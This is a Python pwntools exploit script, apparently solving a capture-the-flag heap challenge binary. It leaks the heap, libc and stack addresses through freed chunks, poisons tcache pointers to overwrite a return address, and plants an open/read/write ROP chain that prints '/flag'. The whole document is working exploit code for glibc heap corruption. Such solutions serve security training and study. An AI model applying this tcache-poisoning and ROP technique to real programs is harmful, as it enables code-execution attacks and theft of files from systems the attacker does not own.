from pwn import *

io = process("./pwn")
libc = ELF("./libc.so.6")

context.log_level = "debug"


def select(id: int):
    io.recvuntil(b"Choice:")
    io.sendline(str(id).encode())


def add():
    """
    malloc(0x100)
    """
    select(1)


def free(idx: int):
    select(2)
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())


def show(idx: int):
    select(3)
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())


def edit(idx: int, size: int, content: bytes):
    select(4)
    io.recvuntil(b"Idx: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)


def debug():
    gdb.attach(
        io,
        gdbscript="""
    decompiler connect ida
    """,
    )


for i in range(9):  # 0..8
    add()  # 0
for i in range(8):  # 0..7
    free(i)
show(0)
heap_base = u64(io.recvuntil(b"\x05")[-5:].ljust(8, b"\x00"))
print("heap base =", hex(heap_base))
edit(7, 1, b"\x01")  # 刚好最开始是 \x00
show(7)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x1E0C01
edit(7, 1, b"\x00")  # 恢复
print("libc base baddress =", hex(libc_base))

environ = libc_base + libc.sym["environ"]
print("environ address =", hex(environ))

ret = libc_base + 0x26699
pop_rdi = libc_base + 0x28A55
pop_rsi = libc_base + 0x2A4CF
pop_rdx = libc_base + 0xC7F32

open_addr = libc_base + libc.sym["open"]
write_addr = libc_base + libc.sym["write"]
read_addr = libc_base + libc.sym["read"]

edit(6, 0x8, p64(environ ^ heap_base))
add()  # 9
add()  # 10
show(10)
stack = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("stack address =", hex(stack))
ret_addr = stack - 0x120 - 0x18
print("return address =", hex(ret_addr))
free(9)

debug()
edit(9, 0x10, p64(ret_addr ^ heap_base))
add()  # 11
add()  # 12
debug()

heap_base = heap_base << 12
# read (0, heap_base+0x2000, 0x8)
payload = (
    cyclic(24)
    + p64(pop_rdi)
    + p64(0)
    + p64(pop_rsi)
    + p64(heap_base + 0x2000)
    + p64(pop_rdx)
    + p64(0x8)
    + p64(read_addr)
)

# open(heap_base + 0x2000, 0, 0)
payload += (
    p64(pop_rdi)
    + p64(heap_base + 0x2000)
    + p64(pop_rsi)
    + p64(0)
    + p64(pop_rdx)
    + p64(0)
    + p64(open_addr)
)

# read(3, heap_base + 0x2100,0x30  )
payload += (
    p64(pop_rdi)
    + p64(3)
    + p64(pop_rsi)
    + p64(heap_base + 0x2100)
    + p64(pop_rdx)
    + p64(0x30)
    + p64(read_addr)
)

# write(1, heap_base + 0x2100, 0x30)
payload += (
    p64(pop_rdi)
    + p64(1)
    + p64(pop_rsi)
    + p64(heap_base + 0x2100)
    + p64(pop_rdx)
    + p64(0x30)
    + p64(write_addr)
)

edit(12, 0x100, payload)

io.send(b"/flag\x00")

io.interactive()
